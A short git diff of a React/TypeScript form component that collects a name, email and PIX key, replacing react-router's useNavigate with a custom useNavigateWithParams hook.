@@ -1,6 +1,6 @@
 import atendente from '../../images/atendente.png';
 import { useState } from "react";
-import { useNavigate } from "react-router-dom";
+import { useNavigateWithParams } from "../../hooks/useNavigateWithParams";
 import gov1 from '../../images/gov1.png';
 import gov2 from '../../images/gov2.png';
 
@@ -11,7 +11,7 @@ function GetInfos() {
     const [pixType, setPixType] = useState<"phone" | "email" | "random" | "unknown">("unknown");
     const [pixError, setPixError] = useState("");
 
-    const navigate = useNavigate();
+    const navigate = useNavigateWithParams();
 
     function handleContinuar() {
         if (!nome.trim() || !email.trim() || !pix.trim()) {
